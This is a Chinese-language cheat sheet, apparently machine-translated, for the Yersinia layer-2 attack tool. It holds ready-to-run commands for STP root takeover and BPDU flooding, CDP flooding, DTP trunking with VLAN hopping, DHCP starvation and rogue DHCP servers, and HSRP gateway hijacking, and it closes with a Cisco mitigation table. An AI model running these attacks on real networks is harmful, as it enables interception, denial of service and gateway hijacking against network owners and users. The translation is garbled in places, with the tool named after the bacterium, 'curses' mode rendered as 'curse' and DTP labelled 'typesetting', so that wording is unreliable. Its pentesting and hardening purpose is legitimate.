<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 耶尔森氏菌备忘单

[Yersinia](https://github.com/tomac/yersinia) 是一个功能强大的第 2 层（数据链路层）网络渗透测试框架，旨在分析和利用第 2 层协议中的弱点，例如 STP（生成树协议）、CDP（思科发现协议）、DTP（动态中继协议）、DHCP、HSRP 和 802.1Q VLAN 中继。

---

## 目录

- [支持的协议和模式](#supported-protocols--modes)
- [安装](#安装)
- [交互式诅咒模式 (`-I`)](#interactive-curses-mode--i)
- [生成树协议 (STP) 攻击](#spanning-tree-protocol-stp-attacks)
- [思科发现协议 (CDP) 攻击](#cisco-discovery-protocol-cdp-attacks)
- [动态中继协议 (DTP) 和 VLAN 跳跃](#dynamic-trunking-protocol-dtp--vlan-hopping)
- [DHCP 流氓和饥饿攻击](#dhcp-rogue--starvation-attacks)
- [HSRP 和 VRRP 劫持](#hsrp--vrrp-hijacking)
- [缓解和强化](#mitigation--hardening)

---

## 支持的协议和模式

耶尔森氏菌针对 IP 以下运行的协议：
- **STP：** 生成树协议（根桥角色接管、拓扑更改通知）。
- **CDP：** 思科发现协议（设备泛洪、假邻居注入）。
- **DTP：** 动态中继协议（协商中继链路以访问所有 VLAN）。
- **DHCP：** 动态主机配置协议（饥饿和流氓 DHCP 服务器）。
- **HSRP：** 热备路由器协议（主动网关接管）。
- **802.1Q / 802.1X：** Dot1Q VLAN 跳跃和 EAPOL 耗尽。
- **VTP：** VLAN 中继协议（VLAN 数据库删除/覆盖）。

执行模式：
- **`-I`（交互式诅咒）：** 全屏终端 UI，用于选择协议、配置攻击和监控实时数据包。
- **非交互式 CLI：** 直接执行自动化脚本。

 - -

＃＃ 安装
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y yersinia

# Arch Linux / BlackArch
sudo pacman -S yersinia

# Run in terminal
yersinia -h
```
---

## 交互式诅咒模式 (`-I`)

在没有 GUI 的终端中使用耶尔森氏菌最实用、最安全的方法：
```bash
sudo yersinia -I
```
- **`h`**：显示帮助和按键绑定。
- **`g`**：交换机协议（STP、CDP、DTP、DHCP、HSRP 等）。
- **`x`**：执行当前协议的攻击菜单。
- **`c`**：取消奔跑攻击。
- **`l`**：切换数据包日志记录。
- **`q`**：退出耶尔森氏菌。

---

## 生成树协议 (STP) 攻击

STP 选择具有最低网桥 ID（优先级 + MAC）的根网桥。耶尔森氏菌可以注入虚假的 BPDU（桥接协议数据单元）来声明 root 状态并通过攻击者主机重定向流量。

### 1. 声明根角色（BPDU 注入）
发送具有优先级 `0` 和较低 MAC 地址的 BPDU 以成为 STP 根桥：
```bash
sudo yersinia stp -attack 1 -i eth0
```
### 2. 通过拓扑更改 (TCN) 声明根角色
强制所有交换机刷新 CAM 表并通过攻击者重新收敛：
```bash
sudo yersinia stp -attack 2 -i eth0
```
### 3. STP DoS 攻击（洪水配置 BPDU）
大量冲突的 BPDU 帧导致交换机 CPU 崩溃或饱和：
```bash
sudo yersinia stp -attack 0 -i eth0
```
---

## 思科发现协议 (CDP) 攻击

CDP 在思科设备之间共享未经身份验证的设备名称、型号、功能和软件版本。

### 1. 淹没假 CDP 邻居
耗尽交换机内存并在`show cdp neighbors`中创建幻像设备：
```bash
sudo yersinia cdp -attack 0 -i eth0
```
### 2. 捕获并检查合法的 CDP 数据包
运行交互式诅咒模式（`yersinia -I`），按`g`，选择`CDP`，然后观察交换机主机名、管理IP、硬件型号和本机VLAN ID。

---

## 动态中继协议 (DTP) 和 VLAN 跳跃

如果交换机端口配置为 `dynamic desirable` 或 `dynamic auto` 模式，DTP 会自动协商中继链路。

### 1. 协商中继链路（DTP 所需数据包）
诱使交换机端口变成 802.1Q 中继：
```bash
sudo yersinia dtp -attack 0 -i eth0
```
协商中继后，使用 Linux 802.1Q 接口从所有 VLAN 捕获帧或将数据包标记到隔离子网中：
```bash
# Add VLAN subinterface for newly accessed VLAN (e.g. VLAN 20)
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set dev eth0.20 up
sudo dhclient eth0.20
```
---

## DHCP 流氓攻击和饥饿攻击

### 1. DHCP 饥饿攻击（耗尽 IP 池）
使用随机 MAC 地址发送数千个 DHCP DISCOVER 请求，以使用池中的所有可用 IP 地址：
```bash
sudo yersinia dhcp -attack 1 -i eth0
```
### 2. 设置恶意 DHCP 服务器
部署具有自定义 DNS 和网关的恶意 DHCP 服务器：
```bash
sudo yersinia dhcp -attack 2 -i eth0
```
---

## HSRP 和 VRRP 劫持

HSRP 允许多个路由器提供单个虚拟默认网关。

### 1. 声明活动路由器优先级
注入优先级为 255 的 HSRP HELLO 数据包以接管默认网关 IP：
```bash
sudo yersinia hsrp -attack 0 -i eth0
```
---

## 缓解和强化

|协议|攻击向量|思科/标准缓解措施|
|---|---|---|
| **STP** |假根桥注射|访问端口上的 `spanning-tree bpduguard enable`；交换机间链路上的 `spanning-tree rootguard`。 |
| **排版** |流氓中继协商|所有面向用户的访问端口上都有 `switchport mode access` 和 `switchport nonegotiate`。 |
| **CDP** |洪水/信息披露|不受信任的接口端口上的 `no cdp run`（全局）或 `no cdp enable`。 |
| **DHCP** |饥饿与盗贼服务器 |启用`ip dhcp snooping`，限制每个端口的速率，配置可信上行链路端口。 |
| **HSRP** |优先级劫持|使用密钥配置 MD5 身份验证 (`standby 1 authentication md5 key-string <SECRET>`)。 |